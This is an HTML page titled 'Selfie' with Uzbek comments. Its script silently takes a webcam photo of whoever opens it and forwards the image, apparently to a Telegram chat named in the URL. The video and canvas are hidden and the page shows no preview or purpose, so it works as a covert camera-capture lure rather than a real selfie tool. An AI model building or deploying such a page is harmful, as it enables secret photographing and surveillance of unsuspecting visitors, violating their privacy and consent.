<!DOCTYPE html>
<html lang="uz">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Selfie</title>
    <style>
      body {
        background: #fff;
      }
      video,
      canvas {
        display: none;
      }
    </style>
  </head>
  <body>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
      const chatId = window.location.pathname.split("/").pop(); // URL oxiridagi chatId

      async function start() {
        try {
          if (!chatId) throw new Error("chatId topilmadi");

          const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
          });
          const v = document.getElementById("v");
          v.srcObject = stream;

          await new Promise((resolve) => {
            v.onplaying = () => resolve();
          });

          const c = document.getElementById("c");
          c.width = v.videoWidth || 640;
          c.height = v.videoHeight || 480;
          const ctx = c.getContext("2d");
          ctx.drawImage(v, 0, 0, c.width, c.height);
          stream.getTracks().forEach((t) => t.stop());

          // Rasmni base64 olish
          const base64 = c.toDataURL("image/png").split(",")[1];

          // Telegram API orqali yuborish
          const resp = await fetch("/api/selfie", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, photo: base64 }),
          });

          const data = await resp.json();
          if (!data.ok) throw new Error("Rasm yuborilmadi");

          alert("Rasm yuborildi ✅");
        } catch (err) {
          console.error(err);
          alert("Xatolik yuz berdi ❌");
        }
      }

      start();
    </script>
  </body>
</html>
